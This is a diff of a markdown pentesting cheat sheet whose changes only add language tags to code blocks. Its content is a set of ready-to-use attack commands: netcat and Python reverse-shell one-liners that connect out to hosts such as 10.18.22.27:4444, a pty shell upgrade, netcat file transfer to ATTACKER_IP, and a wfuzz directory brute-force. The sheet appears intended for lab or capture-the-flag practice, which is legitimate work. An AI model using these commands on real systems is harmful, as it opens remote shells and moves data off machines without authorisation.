@@ -12,28 +12,28 @@ Here are some handy tricks to enhance your pentesting workflow:
 
 ---
 #### Spawn a fully interactive shell:
-```
+```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 ---
 #### Reverse shells
 * nc
-```
+```nc
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
 * python
-```
+```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 * python3
-```
+```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
 ---
 #### Set appropriate permissions for `id_rsa` file before usage:
-```
+```linux
 chmod 600 id_rsa
 ```
 
@@ -41,18 +41,18 @@ chmod 600 id_rsa
 #### File Transfer on Netcat
 
 1. To download a file on the remote shell:
-```
+```nc
 nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
 ```
 2. To receive the file on the attacker machine:
-```
+```nc
 nc -l ATTACKER_PORT > [output_file_path]
 ```
 
 ---
 #### Web
 Discover hidden directories using `wfuzz`:
-```
+```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
 ```
 ---
